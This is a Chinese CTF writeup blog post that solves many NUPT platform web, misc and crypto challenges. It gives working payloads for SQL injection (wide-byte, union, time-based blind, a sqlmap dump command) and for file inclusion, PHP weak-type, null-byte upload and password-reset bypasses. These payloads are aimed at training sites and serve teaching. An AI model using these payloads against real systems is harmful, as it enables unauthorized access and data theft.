文件包含nctf{edulcni_elif_lacol_si_siht} 使用PHP的filter协议读取index.php，即访问 http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/convert.base64-encode/resource=index.php ，将得到的字符串base64解码。 单身一百年也没用nctf{this_is302redirect} flag藏在响应头中。 Download~!nctf{download_any_file_666} 访问 http://way.nuptzj.cn/web6/download.php?url=base64-of-file-name 可以下载允许下载的任意文件，所以先下载download.php，得到白名单列表里有hereiskey.php，再下载下来就可见flag。 COOKIEnctf{cookie_is_different_from_session} 看到响应头中有Set-Cookie: Login=0，因此在请求头加入Cookie: Login=1即可。 MYSQLnctf{query_in_mysql} 根据提示查看robots.txt，内容如下 123456789101112131415TIP:sql.php&lt;?phpif($_GET[id]) &#123; mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $id = intval($_GET[id]); $query = @mysql_fetch_array(mysql_query("select content from ctf2 where id='$id'")); if ($_GET[id]==1024) &#123; echo "&lt;p&gt;no! try again&lt;/p&gt;"; &#125; else&#123; echo($query[content]); &#125;&#125;?&gt; 说明要向sql.php提交一个id，使得intval($_GET[id])为1024而$_GET[id]==1024为假。intval识别到非数字的那一位，而松散比较前的强制类型转换会把e当作科学计数法的一部分处理，所以可以提交id=1024e1等，如访问http://chinalover.sinaapp.com/web11/sql.php?id=1024e1。 1、robots.txt可能藏有提示 2、int intval ( mixed $var [, int $base = 10 ] )只取/\d*/的部分。 sql injection 3nctf{gbk_3sqli} 分别访问id=2和id=3得到提示gbk_sql_injection和the fourth table，所以是存在宽字节注入，flag在第四个表里面。上sqlmap跑一跑，最后一步是这样： 1python sqlmap.py -u "http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%d6'" -T ctf4 -C flag --dump 也可以手注： 步骤一：确认该点存在注入12345http://chinalover.sinaapp.com/SQL-GBK/index.php?id=2 和http://chinalover.sinaapp.com/SQL-GBK/index.php?id=2%d6%27--+ 返回结果相同。由于MySQL执行查询时会跳过畸形字符，而 id=2%d6%27--+ 经过转义变为id=2%d6%5c%27--+ ，其中%d6%5c被合在一起解释，也就是id = '2Ö'-- 效果等价于 id = '2'--，但我们获得了执行sql的机会。 步骤二：查询数据库名123发现支持union查询 ，http://chinalover.sinaapp.com/SQL-GBK/index.php?id=2%d6%27+and+0+union+select+null,database()--+ ，之所以要加and+0+是因为显示点只有一处，必须让原来的查询失败。得到数据库名为'sae-chinalover'。 步骤三：查询名为’sae-chinalover’的数据库的表的数量和名字123456http://chinalover.sinaapp.com/SQL-GBK/index.php?id=2%d6'+and+0+union+select+null,count(*)+from+information_schema.tables+where+table_schema=database()--+得到目前的数据库含有5张表http://chinalover.sinaapp.com/SQL-GBK/index.php?id=2%d6'+and+0+union+select+null,table_name+from+information_schema.tables+where+table_schema=database()+limit+3,1--+得到第四张表表名为'ctf4'MySQL的information_schema数据库包含所有数据库的元信息，其中的tables表包含其他数据库的数据库名、表名、表类型、创建时间等许多信息，其中table_schema列为数据库名，table_name列为表名。因为能显示出来的记录有限，所以必须用limit来控制要显示第几条记录，否则只能显示第一条。limit用法是这样LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125;，必须放在where后面。 步骤四：查询表’ctf4’中的flag1234http://chinalover.sinaapp.com/SQL-GBK/index.php?id=2%d6'+and+0+union+select+null,count(*)+from+ctf4--+发现该表只有一条记录http://chinalover.sinaapp.com/SQL-GBK/index.php?id=2%d6'+and+0+union+select+null,flag+from+ctf4--+猜测列名为flag，查询得到flag 附一个select查询语法 1234567891011121314151617181920212223SELECT [ALL | DISTINCT | DISTINCTROW ] [HIGH_PRIORITY] [STRAIGHT_JOIN] [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT] [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS] select_expr [, select_expr ...] [FROM table_references [PARTITION partition_list] [WHERE where_condition] [GROUP BY &#123;col_name | expr | position&#125; [ASC | DESC], ... [WITH ROLLUP]] [HAVING where_condition] [ORDER BY &#123;col_name | expr | position&#125; [ASC | DESC], ...] [LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125;] [PROCEDURE procedure_name(argument_list)] [INTO OUTFILE 'file_name' [CHARACTER SET charset_name] export_options | INTO DUMPFILE 'file_name' | INTO var_name [, var_name]] [FOR UPDATE | LOCK IN SHARE MODE]] /x00nctf{use00to_jieduan} 访问得到源码 12345678if (isset ($_GET['nctf'])) &#123; if (@ereg ("^[1-9]+$", $_GET['nctf']) === FALSE) echo '必须输入数字才行'; else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE) die('Flag: '.$flag); else echo '骚年，继续努力吧啊~'; &#125; 要求提交的nctf的值符合正则匹配(一个或多个数字)并且能被strpos找到#biubiubiu ，根据提示查到资料ereg会把null视为字符串的结束，从而被%00截断，而strpos则可以越过%00，所以提交nctf=1%00%23biubiubiu即可。 参考资料 由于在PHP中string的实现本质上是一个以字节为单位的数组加上一个声明缓冲区长度的整形，因此string类型可以由任何值构成，即使是“NUL bytes”，但PHP中有些底层库（比如C语言相关的，因为C语言中\0标识字符串的结束）会忽略”a NUL byte”后面的数据，使用了这些库的函数就是非二进制安全的(non-binary-safe)，ereg就是一个例子。闲着无聊搜了一下发现还有这么一些函数： int strcoll ( string $str1 , string $str2 )Locale based string comparison (when current locale is not C or POSIX) public array TokyoTyrantTable::get ( mixed $keys )Gets a row from table database. (version&gt;0.3.0) public Exception::__construct ([ string $message = “” [, int $code = 0 [, Throwable $previous = NULL ]]] )Construct the exception 。其中对message的处理是非二进制安全的。 public Error::__construct ([ string $message = “” [, int $code = 0 [, Throwable $previous = NULL ]]] )Construct the error object 。其中对message的处理是非二进制安全的。 bool error_log ( string $message [, int $message_type = 0 [, string $destination [, string $extra_headers ]]] )Sends an error message to the web server’s error log or to a file.。其中对message的处理是非二进制安全的。(error_log() is not binary safe. message will be truncated by null character.) bool radius_put_string ( resource $radius_handle , int $type , string $value [, int $options = 0 [, int $tag ]] )Attaches a string attribute。 其中$value值基于会被null截断的底层库，是非二进制安全的。 bool radius_put_vendor_string ( resource $radius_handle , int $vendor , int $type , string $value [, int $options = 0 [, int $tag ]] )Attaches a vendor specific string attribute 。$value是非二进制安全的。 string addcslashes ( string $str , string $charlist ) （存疑，似乎并不是）Quote string with slashes in a C style. Returns a string with backslashes before characters that are listed in charlist parameter. array gzfile ( string $filename [, int $use_include_path = 0 ] ) （存疑，待验证）Read entire gz-file into an array 还有这些 1234567891011121314151617&lt;?php$s=$_REQUEST['a']; // http://localhost/test.php?a=asd%00asdf$p='asdf';var_dump(ereg_replace($p,'abcc',$s)); //string(3) "asd" var_dump(eregi_replace($p,'abcc',$s));//string(3) "asd" var_dump(ereg($p,$s));//bool(false) var_dump(eregi($p,$s));//bool(false) var_dump(split($p,$s));//array(1) &#123; [0]=&gt; string(8) "asd\0asdf" &#125; var_dump(split($p,$s));//array(1) &#123; [0]=&gt; string(8) "asd\0asdf" &#125; var_dump(sql_regcase($s)); //看起来没问题啊。。。string(29) "[Aa][Ss][Dd]\0[Aa][Ss][Dd][Ff]" // ereg_replace — Replace regular expression// ereg — Regular expression match// eregi_replace — Replace regular expression case insensitive// eregi — Case insensitive regular expression match// split — Split string into array by regular expression// spliti — Split string into array by regular expression case insensitive// sql_regcase — Make regular expression for case insensitive match bypass againnctf{php_is_so_cool} 访问得到源码 1234567if (isset($_GET['a']) and isset($_GET['b'])) &#123;if ($_GET['a'] != $_GET['b'])if (md5($_GET['a']) === md5($_GET['b']))die('Flag: '.$flag);elseprint 'Wrong.';&#125; 源码要求提交两个不相等的值使他们的md5值严格相等。md5()函数要求接收一个字符串，若传递进去一个数组，则会返回null，即var_dump(md5(array(2))===null);值为bool(true) ，因此向$_GET数组传入两个名为a、b的不相等的数组，从而导致md5()均返回空，于是得到flag，如访问 http://chinalover.sinaapp.com/web17/index.php?a[]=&amp;b[]=1 变量覆盖nctf{bian_liang_fu_gai!} source.php核心代码如下 123456&lt;?php if ($_SERVER["REQUEST_METHOD"] == "POST") &#123; extract($_POST); if ($pass == $thepassword_123) echo $theflag; &#125; extract()函数原型为int extract(array &amp;$var_array [,int $extract_type=EXTR_OVERWRITE [,string $prefix = NULL]]) ，从数组中将变量导入当前符号表，$extract_type缺省值为1，若没有另外指定，函数将覆盖已有变量，故传入任意pass和与之相等的thepassword_123即可。其实我们甚至可以覆盖theflag变量，但是那样就拿不到真正的flag了 :D。source.php包含源码。 PHP是世界上最好的语言nctf{php_is_best_language} index.txt核心代码如下 1234567891011&lt;?phpif(eregi("hackerDJ",$_GET[id])) &#123; echo("&lt;p&gt;not allowed!&lt;/p&gt;"); exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == "hackerDJ")&#123; echo "&lt;p&gt;Access granted!&lt;/p&gt;"; echo "&lt;p&gt;flag: *****************&#125; &lt;/p&gt;";&#125; 网页会拒绝任何含有hackerDJ的提交(忽略大小写)，但接受urldecode后为hackerDJ的字符串，所以按照对照表编码，并将%编码为%25后提交，自动解码一次后%25变为%,代码中再解码一次后便得到flag。即访问 http://way.nuptzj.cn/php/index.php?id=%2568%2561%2563%256b%2565%2572%2544%254a 这是个二次编码的问题。 伪装者 这是一个到处都有着伪装的世界题目地址：点我 nctf{happy_http_headers} referer改了没用，据说请求头添加X-Forwarded-For: 127.0.0.1即可，没有成功，怀疑服务端代码有问题，可能是和你从哪里来那题一样的问题。XFF头用以标志客户端真实IP，常用在使用HTTP 代理或者负载均衡服务时。 headernctf{tips_often_hide_here} 使用chrome浏览器的开发者工具可以看到相应数据包的头部有flag字段，其值即flag。 上传绕过 题目地址：猜猜代码怎么写的 nctf{welcome_to_hacks_world} 当filename为1.jpg时返回如下: 12345678910111213141516Array( [0] =&gt; .jpg [1] =&gt; jpg)Upload: 1.jpg&lt;br /&gt;Type: text/plain&lt;br /&gt;Size: 0.0078125 Kb&lt;br /&gt;Stored in: ./uploads/8a9e5f6a7a789acb.phparray(4) &#123; ["dirname"]=&gt; string(9) "./uploads" ["basename"]=&gt; string(5) "1.jpg" ["extension"]=&gt; string(3) "jpg" ["filename"]=&gt; string(1) "1"&#125;&lt;br&gt;必须上传成后缀名为php的文件才行啊！&lt;br&gt;&lt;/body&gt; 当filename为1.php时返回如下： 123456Array( [0] =&gt; .php [1] =&gt; php)不被允许的文件类型,仅支持上传jpg,gif,png后缀的文件 观察源码为： 123456789文件上传&lt;br&gt;&lt;br&gt;&lt;form action="upload.php" method="post"enctype="multipart/form-data"&gt;&lt;label for="file"&gt;Filename:&lt;/label&gt;&lt;input type="hidden" name="dir" value="/uploads/" /&gt;&lt;input type="file" name="file" id="file" /&gt; &lt;br /&gt;&lt;input type="submit" name="submit" value="Submit" /&gt;&lt;/form&gt; 因为最后应该是dir和file连接，所以可以通过修改隐藏元素dir的value来实现截断上传。即抓包后修改 /uploads/为/uploads/1.php0x00，然后file保持1.jpg，连起来后就是/uploads/1.php%001.jpg，则既绕过了白名单验证又上传了PHP后缀的文件。（0x00是指修改16进制值，不可见。） sql注入1 听说你也会注入？地址： 题目地址 nctf{ni_ye_hui_sql?} 在 http://chinalover.sinaapp.com/index.phps 查看源码，核心部分如下： 1234567891011121314151617&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = trim($_POST[user]); $pass = md5(trim($_POST[pass])); $sql="select user from ctf where (user='".$user."') and (pw='".$pass."')"; echo '&lt;/br&gt;'.$sql; $query = mysql_fetch_array(mysql_query($sql)); if($query[user]=="admin") &#123; echo "&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;"; &#125; if($query[user] != "admin") &#123; echo("&lt;p&gt;You are not admin!&lt;/p&gt;"); &#125;&#125;echo $query[user]; 会对传入参数两端去空格，然后sql拼接如下 $sql=&quot;select user from ctf where (user=&#39;&quot;.$user.&quot;&#39;) and (pw=&#39;&quot;.$pass.&quot;&#39;)&quot;; ， 所以只要用构造一下user的值，使语法无误，然后注释掉后面的即可。MySQL主要有三种注释方式#注释到行尾，/*bla*/用于行间或多行注释，--也是注释到行尾，但需要注意的是在两个减号后面至少要有一个\s，也就是空格，TAB，换行符等。 所以本题可post user=admin&#39;)-- -&amp;pass=123或user=admin&#39;)#&amp;pass=123， sql语句就变成select user from ctf where (user=&#39;admin&#39;)#&#39; and (pw=&#39;123&#39;), 查询语句就能成功返回user列，值为admin的那条记录。 pass checknctf{strcmp_is_n0t_3afe} 1234567891011121314&lt;?php$pass=@$_POST['pass'];$pass1=***********;//被隐藏起来的密码if(isset($pass))&#123;if(@!strcmp($pass,$pass1))&#123;echo "flag:nctf&#123;*&#125;";&#125;else&#123;echo "the pass is wrong!";&#125;&#125;else&#123;echo "please input pass!";&#125;?&gt; 考察PHP弱类型，从PHP社区文档的注解可以发现strcmp函数在比较失败，即传入数组，时会返回null。(还有一个比较有意思的是当有一个字符串长度为0时，返回的是相互比较的两个字符串长度的差值。)所以post的数据为pass[]= 起名字真难nctf{follow_your_dream} 12345678910111213141516171819202122&gt; &lt;?php&gt; function noother_says_correct($number)&gt; &#123;&gt; $one = ord('1');&gt; $nine = ord('9');&gt; for ($i = 0; $i &lt; strlen($number); $i++)&gt; &#123; &gt; $digit = ord($number&#123;$i&#125;);&gt; if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )&gt; &#123;&gt; return false;&gt; &#125;&gt; &#125;&gt; return $number == '54975581388';&gt; &#125;&gt; $flag='*******';&gt; if(noother_says_correct($_GET['key']))&gt; echo $flag;&gt; else &gt; echo 'access denied';&gt; ?&gt;&gt; 要求传入key不包含[1-9]，但又等于54975581388，考虑转十六进制，发现54975581388=0xccccccccc， 因此访问 http://chinalover.sinaapp.com/web12/index.php?key=0xccccccccc 密码重置 重置管理员账号：admin 的密码 你在点击忘记密码之后 你的邮箱收到了这么一封重置密码的邮件： 点击此链接重置您的密码 nctf{reset_password_often_have_vuln 修改重置链接的URL和POST中对应参数为admin相关的即可。 即向 http://nctf.nuptzj.cn/web13/index.php?user1=YWRtaW4%3D post user=admin&amp;newpass=aaaaa&amp;vcode=1234 。 php反序列化 123456789101112131415161718192021&gt; &lt;?php&gt; class just4fun &#123;&gt; var $enter;&gt; var $secret;&gt; &#125;&gt; if (isset($_GET['pass'])) &#123;&gt; $pass = $_GET['pass'];&gt; if(get_magic_quotes_gpc())&#123;&gt; $pass=stripslashes($pass);&gt; &#125;&gt; $o = unserialize($pass);&gt; if ($o) &#123;&gt; $o-&gt;secret = "*";&gt; if ($o-&gt;secret === $o-&gt;enter)&gt; echo "Congratulation! Here is my secret: ".$o-&gt;secret;&gt; else &gt; echo "Oh no... You can't fool me";&gt; &#125;&gt; else echo "are you trolling?";&gt; &#125;&gt; 链接失效，本地搭建环境实验。反序列化后的secret成员被赋予未知的值却要求另一成员enter其值与之相同， 从官方文档看到这么一句 Circular references inside the array/object you are serializing will also be stored， 说明对象包含的引用在序列化时也会被存储，所以如果enter指向secret的引用，两个成员的值就可以同步变化了。 12345678910111213&lt;?phpclass just4fun&#123; var $secret; var $enter ;&#125;$f=new just4fun();$f-&gt;enter=&amp;$f-&gt;secret;$sf=serialize($f);print_r($sf);$usf=unserialize($sf);echo '&lt;br/&gt;';print_r($usf); 输出如下 O:8:”just4fun”:2:{s:6:”secret”;N;s:5:”enter”;R:2;}just4fun Object ( [secret] =&gt; [enter] =&gt; ) 访问 http://127.0.0.1/nanyou.php?pass=O:8:%22just4fun%22:2:{s:6:%22secret%22;N;s:5:%22enter%22;R:2;} 验证成功。 别处看到flag为nctf{serialize_and_unserialize} sql injection4 继续注入吧~题目地址 TIP:反斜杠可以用来转义仔细查看相关函数的用法 nctf{sql_injection_is_interesting} 页面源代码注释中有SQL构造方式： 123456789101112131415161718192021#GOAL: login as admin,then get the flag;error_reporting(0);require 'db.inc.php';function clean($str)&#123; if(get_magic_quotes_gpc())&#123; $str=stripslashes($str); &#125; return htmlentities($str, ENT_QUOTES);&#125;$username = @clean((string)$_GET['username']);$password = @clean((string)$_GET['password']);$query='SELECT * FROM users WHERE name=\''.$username.'\' AND pass=\''.$password.'\';';$result=mysql_query($query);if(!$result || mysql_num_rows($result) &lt; 1)&#123; die('Invalid password!');&#125;echo $flag; 核心函数是htmlentities($str, ENT_QUOTES) ，函数原型是这样 1string htmlentities ( string $string [, int $flags = ENT_COMPAT | ENT_HTML401 [, string $encoding = ini_get("default_charset") [, bool $double_encode = true ]]] ) 参数flags缺省情况下与$flags=ENT_QUOTES情况下函数行为不同， 选值为ENT_QUOTES时Will convert both double and single quotes， 也就是说，前者不会将单引号编码而后者会。我们的最终目标是平衡引号，从而使查询语句语法正确，既然无法输入单引号，就消灭单引号。 访问http://chinalover.sinaapp.com/web15/index.php?username=\&amp;password=%20or%201%23， 也就是构造payload为?username=\&amp;password=%20or%201%23 ，使得查询语句如下： 12345678SELECT * FROM users WHERE name='\' AND pass='%20or%201%23'即SELECT * FROM users WHERE name='\' AND pass=' 『 [name]的值为 [' AND pass=] ，显然逻辑值为false 』or 1 『 但没关系，[false or 1] 的逻辑值为真』 #' 『 注释掉多余的单引号 』即select * from users where false or 1 附： ​ 具体编码方式可使用 print_r(get_html_translation_table($table =HTML_ENTITIES,$flags=ENT_QUOTES))查看， `ENT_COMPAT ENT_HTML401` ENT_QUOTES [&amp;] =&gt; &amp;amp; [&amp;] =&gt; &amp;amp; [&quot;] =&gt; &amp;quot; [&quot;] =&gt; &amp;quot; [&lt;] =&gt; &amp;lt; [&#39;] =&gt; &amp;#039; [&gt;] =&gt; &amp;gt; [&lt;] =&gt; &amp;lt; … [&gt;] =&gt; &amp;gt; 共100个 共101个 综合题nctf{bash_history_means_what} 1、访问链接得到一大段jsfuck代码，解码后得到document.write(&quot;1bc29b36f623ba82aaf6724fd3b16718.php&quot;) ; 2、访问 http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/1bc29b36f623ba82aaf6724fd3b16718.php 在HTTP响应头得到提示tip:history of bash; 3、访问 http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history ，看到页面内容为zip -r flagbak.zip ./* ; 4、访问 http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip 得到flag。 sql 注入2 注入第二题~~主要考察union查询传送门:点我带你飞 ntcf{union_select_is_wtf} index/phps中有源码如下 123456789101112131415&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = $_POST[user]; $pass = md5($_POST[pass]); $query = @mysql_fetch_array(mysql_query("select pw from ctf where user='$user'")); if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123; echo "&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;"; &#125; else &#123; echo("&lt;p&gt;Log in failure!&lt;/p&gt;"); &#125;&#125;?&gt; 因为 12var_dump(!strcasecmp(array(), $query[pw]));//bool(true)var_dump(!strcasecmp(md5(array()), $query[pw]));//bool(false) 所以没法用把pass作为数组传进去的伎俩。另外虽然第七行的$user处存在注入，但输出没有回显。想到基于时间延迟的盲注。主要用到三个函数，mid()，if()和sleep()： 123456MID(str,pos,len)/*需注意pos从1而不是0开始，Return a substring starting from the specified position*/IF(expr1,expr2,expr3)/*If expr1 is TRUE (expr1 &lt;&gt; 0 and expr1 &lt;&gt; NULL), IF() returns expr2. Otherwise, it returns expr3.*/SLEEP(duration)/*Sleeps (pauses) for the number of seconds given by the duration argument, then returns 0.If SLEEP() is interrupted, it returns 1. The duration may have a fractional part.*/ 所以构造post数据 1user=admin' and if(mid(pw,1,1)&gt;'9',sleep(2),1)#&amp;pass=blabla 如果if()函数的expr1正确，页面响应就会延时两秒，否则不会，以此为依据采用二分法调整。 pw字段的取值范围为/[\da-e]/， 最后注处字段值为21dd715a3605b2a4053e80387116c190，即md5(&#39;njupt&#39;) 然后postuser=admin&amp;pass=njupt即可。 index.phps藏源码。 1234&gt; 查到另一种简单的做法，即post如下数据&gt; user=' union select '45cf93bd4f762c6597b68e615b153bd0'#&amp;pass=findneo&gt; 其中'45cf93bd4f762c6597b68e615b153bd0'即md5('findneo')&gt; &gt; 这才是出题者的本意。我觉得这个做法很妙，看似理所当然的代码逻辑实际上不堪一击。 综合题2 非xss题 但是欢迎留言~地址：get the flag flag:nctf{you_are_s0_g00d_hacker} 详见南邮CTF平台综合题2writeup 注入实战一 请使用firefox浏览器，并安装hackbar插件（自行百度并熟悉）目标网址：地址flag为管理员密码的32位md5(小写)并且加上nctf{} 手注教程群里面发过。看不懂的话自行百度”mysql手动注入”查阅相关文章 PS:用sqlmap等工具做的就不要厚脸皮提交了 题目貌似坏了，放个 4ct10n 的解答吧。 密码就在上图BSCmarketing24然后再md5加密成 f3d6cc916d0739d853e50bc92911dddbflag: nctf{f3d6cc916d0739d853e50bc92911dddb} 密码重置2 题题被秒，当时我就不乐意了！本题来源于CUMT题目链接 TIPS:1.管理员邮箱观察一下就可以找到2.linux下一般使用vi编辑器，并且异常退出会留下备份文件3.弱类型bypass nctf{thanks_to_cumt_bxs} 1、按照提示，源码中看到管理员邮箱为admin@nuptzj.cn ； 2、wget http://nctf.nuptzj.cn/web14/.submit.php.swp ； 3、 12345678910111213if(!empty($token)&amp;&amp;!empty($emailAddress))&#123; if(strlen($token)!=10) die('fail'); if($token!='0') die('fail'); $sql = "SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'"; $r = mysql_query($sql) or die('db error'); $r = mysql_fetch_assoc($r); $r = $r['num']; if($r&gt;0)&#123; echo $flag; &#125;else&#123; echo "失败了呀"; &#125;&#125; 要求token长度为10且token!=&#39;0&#39;为假，可利用弱类型（含有数字内容的字符串也会被转换类型，所以&#39;0e123&#39;==&#39;0&#39;值为真）绕过，访问 http://nctf.nuptzj.cn/web14/submit.php?emailAddress=admin%40nuptzj.cn&amp;token=0e12345678 即可。 MISC图种 flag是动态图最后一句话的拼音首字母加上nctf{} nctf{dssdcmlw} binwalk -e 555.gif分离出一张233333.gif，动态图的最后一帧的最后一句话是 都深深的出卖了我 丘比龙De女神 丘比龙是丘比特的弟弟，由于吃了太多的甜甜圈导致他飞不动了！ 没错 里面隐藏了一张女神的照片flag是照片文件的md5值(小写)记住加上flag{} 文件尾有nvshen.jpg字样，故搜索字符串nvshen，共出现两次，猜测从第一次出现位置上方的love起到文件末尾为一个密码为love的压缩包，复制出来后修改6C6F7665 为504b0304 ,解压得到女神的照片。 flag{a6caad3aaafa11b6d5ed583bef4d8a54} 密码学easy! 密文：bmN0Znt0aGlzX2lzX2Jhc2U2NF9lbmNvZGV9这题做不出来就剁手吧！ nctf{this_is_base64_encode} 在Linux命令行输入echo bmN0Znt0aGlzX2lzX2Jhc2U2NF9lbmNvZGV9 | base64 -d即可 keyboard 看键盘看键盘看键盘！答案非标准格式，提交前加上nctf{}ytfvbhn tgbgy hjuygbn yhnmki tgvhn uygbnjm uygbn yhnijm 观察题干字符串在键盘上的位置构成的轨迹。 nctf{areuhack} base64全家桶 全家桶全家桶全家桶！我怎么饿了。。。。。。密文(解密前删除回车)： R1pDVE1NWlhHUTNETU4yQ0dZWkRNTUpYR00zREtNWldHTTJES1JSV0dJM0RDTlpUR1kyVEdNWlRHSTJVTU5SUkdaQ1RNTkJWSVkzREVOUlJHNFpUTU5KVEdFWlRNTjJF 按base64、base32、base16的顺序解码一遍即可。 nctf{base64 _ base32_and_base16} n次base6412345import base64 as bs='**'while 1: s=b.b64decode(s) print s nctf{please_use_python_to_decode_base64} 骚年来一发吗 密文：iEJqak3pjIaZ0NzLiITLwWTqzqGAtW2oyOTq1A3pzqas 1234567891011&gt; function encode($str)&#123;&gt; $_o=strrev($str);&gt; for($_0=0;$_0&lt;strlrn($_o),$_0++)&#123;&gt; $_c=substr($_o,$_0,1);&gt; $__=ord($_c)+1;&gt; $_c=chr($__);&gt; $_=$_.$_c;&gt; &#125;&gt; return str_rot13(strrev(base64_encode($_)));&gt; &#125;&gt; encode函数先反转明文字符串，再逐字符加一，然后base64编码，再反转，再rot13，然后返回加密后的字符串。 1234567891011&lt;?php$s="iEJqak3pjIaZ0NzLiITLwWTqzqGAtW2oyOTq1A3pzqas";function decode($str)&#123; $strtmp=base64_decode(strrev(str_rot13($str))); $res=''; for($i=0;$i&lt;strlen($strtmp);$i++)&#123; $res.=chr(ord(substr($strtmp, $i,1))-1); &#125; return strrev($res);&#125;echo decode($s); nctf{rot13and_base64and_strrev} mixed base64 多重base64加密，干(sang)得(xin)漂(bing)亮(kuang)! 1234567891011121314&gt; import random&gt; from base64 import *&gt; result=&#123;&gt; '16':lambda x:b16encode(x),&gt; '32':lambda x:b32encode(x),&gt; '64':lambda x:b64encode(x)&gt; &#125;&gt; flag=b"&#123;nctf&#123;***&#125;"&gt; for i in range(10):&gt; a=random.choice(['16','32','64'])&gt; flag=result[a](flag)&gt; with open("code.txt",'wb')as f:&gt; f.write(flag)&gt; 解码代码： 123456789101112131415from base64 import b64decode, b32decode, b16decodewith open('code.txt', 'r') as f: c = f.read()def trys(s): for f in [b64decode, b32decode, b16decode]: try: t = f(s) if t[:4] == "nctf": print t return 0 else: trys(t) except: passtrys(c) nctf{random_mixed_base64_encode} 异性相吸 同性真爱，异性相吸都是假的！（题目要求，我是直的） 解密压缩文件里的内容 TIPS:1.xor2.hex2binary3.len(bin(miwen))==len(bin(mingwen)) 123456c=open('密文.txt').read()p=open('明文.txt').read()s=''for i in range(len(c)): s+=chr(ord(c[i])^ord(p[i]))print s nctf{xor_xor_xor_biubiubiu} MD5 python大法好！这里有一段丢失的md5密文e9032???da???08????911513?0???a2要求你还原出他并且加上nctf{}提交 已知线索 明文为： TASC?O3RJMV?WDJKX?ZM 题目来源：安恒杯 123456789101112import hashlibpool = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ's0 = 'TASC?O3RJMV?WDJKX?ZM'ss = s0.split('?')m = 'e9032???da???08????911513?0???a2'for i in pool: for j in pool: for k in pool: s = ss[0] + i + ss[1] + j + ss[2] + k + ss[3] if hashlib.md5(s).hexdigest()[:5] == m[:5]: print s, hashlib.md5(s).hexdigest() break nctf{e9032994dabac08080091151380478a2} Vigenere It is said that Vigenere cipher does not achieve the perfect secrecy actually :-) Tips:1.The encode pragram is given;2.Do u no index of coincidence ？3.The key is last 6 words of the plain text(with “nctf{}” when submitted, also without any interpunction) 12345678910111213141516171819202122232425262728293031323334353637http://ctf.nuptsast.com/static/uploads/13706e3281c1fb0c04417d3452cb745b/encode.cpp#include &lt;stdio.h&gt;#define KEY_LENGTH 2 // Can be anything from 1 to 13main()&#123; unsigned char ch; FILE *fpIn, *fpOut; int i; unsigned char key[KEY_LENGTH] = &#123;0x00, 0x00&#125;; /* of course, I did not use the all-0s key to encrypt */ fpIn = fopen("ptext.txt", "r"); fpOut = fopen("ctext.txt", "w"); i=0; while (fscanf(fpIn, "%c", &amp;ch) != EOF) &#123; /* avoid encrypting newline characters */ /* In a "real-world" implementation of the Vigenere cipher, every ASCII character in the plaintext would be encrypted. However, I want to avoid encrypting newlines here because it makes recovering the plaintext slightly more difficult... */ /* ...and my goal is not to create "production-quality" code =) */ if (ch!='\n') &#123; fprintf(fpOut, "%02X", ch ^ key[i % KEY_LENGTH]); // ^ is logical XOR i++; &#125; &#125; fclose(fpIn); fclose(fpOut); return;&#125; ----------------------------------------------------------------------------------http://ctf.nuptsast.com/static/uploads/9a27a6c8b9fb7b8d2a07ad94924c02e5/code.txtF96DE8C227A259C87EE1DA2AED57C93FE5DA36ED4EC87EF2C63AAE5B9A7EFFD673BE4ACF7BE8923CAB1ECE7AF2DA3DA44FCF7AE29235A24C963FF0DF3CA3599A70E5DA36BF1ECE77F8DC34BE129A6CF4D126BF5B9A7CFEDF3EB850D37CF0C63AA2509A76FF9227A55B9A6FE3D720A850D97AB1DD35ED5FCE6BF0D138A84CC931B1F121B44ECE70F6C032BD56C33FF9D320ED5CDF7AFF9226BE5BDE3FF7DD21ED56CF71F5C036A94D963FF8D473A351CE3FE5DA3CB84DDB71F5C17FED51DC3FE8D732BF4D963FF3C727ED4AC87EF5DB27A451D47EFD9230BF47CA6BFEC12ABE4ADF72E29224A84CDF3FF5D720A459D47AF59232A35A9A7AE7D33FB85FCE7AF5923AA31EDB3FF7D33ABF52C33FF0D673A551D93FFCD33DA35BC831B1F43CBF1EDF67F0DF23A15B963FE5DA36ED68D378F4DC36BF5B9A7AFFD121B44ECE76FEDC73BE5DD27AFCD773BA5FC93FE5DA3CB859D26BB1C63CED5CDF3FE2D730B84CDF3FF7DD21ED5ADF7CF0D636BE1EDB79E5D721ED57CE3FE6D320ED57D469F4DC27A85A963FF3C727ED49DF3FFFDD24ED55D470E69E73AC50DE3FE5DA3ABE1EDF67F4C030A44DDF3FF5D73EA250C96BE3D327A84D963FE5DA32B91ED36BB1D132A31ED87AB1D021A255DF71B1C436BF479A7AF0C13AA14794 详见 南邮CTF平台 Vigenere writeup 。]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[武汉大学C语言上机训练系统练习]]></title>
    <url>%2F160820WHUOJStarter%2F</url>
